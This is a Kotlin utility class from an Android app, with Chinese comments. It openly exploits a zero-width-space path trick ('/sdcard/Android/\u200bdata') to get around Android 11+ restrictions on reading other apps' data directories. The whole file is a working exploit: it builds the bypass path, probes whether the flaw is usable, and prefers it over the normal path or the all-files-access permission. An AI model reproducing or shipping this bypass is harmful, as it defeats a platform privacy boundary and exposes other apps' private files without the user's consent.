package com.shauiqiu.fe

import android.os.Build
import android.os.Environment
import java.io.File

/**
 * 零宽字符漏洞工具类
 * 利用 \u200b 零宽空格绕过 Android 11+ 对 /sdcard/Android/data 的访问限制
 */
object ZWCHelper {
    private const val TAG = "ZWCHelper"
    
    // 零宽空格 Unicode 字符
    private const val ZWC = "\u200b"
    
    // 绕过路径：/sdcard/Android/​data（中间有 \u200b）
    private const val BYPASS_PATH = "/sdcard/Android/$ZWC" + "data"
    
    // 常规路径
    private const val NORMAL_PATH = "/sdcard/Android/data"
    
    /**
     * 获取零宽字符绕过路径
     * 绕过路径：/sdcard/Android/​data（中间有 \u200b）
     */
    fun getBypassDataPath(): String = BYPASS_PATH
    
    /**
     * 获取修正后的 data 路径
     * 根据系统版本和漏洞可用性返回合适的路径
     */
    fun getRevisePath(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+ 优先尝试零宽字符绕过路径
            if (isVulnerabilityAvailable()) {
                BYPASS_PATH
            } else {
                NORMAL_PATH
            }
        } else {
            // Android 10 及以下直接使用常规路径
            NORMAL_PATH
        }
    }
    
    /**
     * 获取修正后的 File 对象
     */
    fun getReviseFile(): File {
        return File(getRevisePath())
    }
    
    /**
     * 检测零宽字符漏洞是否可用
     * 
     * @return true 如果漏洞可用（可以读取 /sdcard/Android/\u200bdata 目录）
     */
    fun isVulnerabilityAvailable(): Boolean {
        return try {
            // Android 11+ 才需要检测零宽字符漏洞
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                // Android 10 及以下不需要漏洞，可以直接访问
                return true
            }
            
            // 检测零宽字符绕过路径是否可读
            val bypassFile = File(BYPASS_PATH)
            val canRead = bypassFile.canRead()
            val isDirectory = bypassFile.isDirectory
            
            // 额外验证：尝试列出目录内容
            val canList = try {
                bypassFile.list() != null
            } catch (e: Exception) {
                false
            }
            
            canRead && isDirectory && canList
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * 检测直读模式是否可用（普通方式或零宽字符漏洞）
     * 
     * @return true 如果可以通过直读或漏洞方式访问 data 目录
     */
    fun isDirectReadAvailable(): Boolean {
        return try {
            // 首先检查是否有全文件访问权限
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!Environment.isExternalStorageManager()) {
                    // 没有全文件访问权限，尝试零宽字符漏洞
                    return isVulnerabilityAvailable()
                }
            }
            
            // 有权限或 Android 10 及以下，直接检查常规路径
            val normalFile = File(NORMAL_PATH)
            if (normalFile.canRead() && normalFile.isDirectory) {
                return true
            }
            
            // 常规路径不可读，尝试零宽字符漏洞
            isVulnerabilityAvailable()
        } catch (e: Exception) {
            false
        }
    }
    
    /**
     * 获取状态描述文本
     */
    fun getStatusDescription(): String {
        return when {
            Build.VERSION.SDK_INT < Build.VERSION_CODES.R -> "Android 10 及以下，无需特殊处理"
            isVulnerabilityAvailable() -> "零宽字符漏洞可用，可访问 Android/data"
            Environment.isExternalStorageManager() -> "全文件访问权限已获取"
            else -> "暂不支持直读，请授权全文件访问或使用其他模式"
        }
    }
}
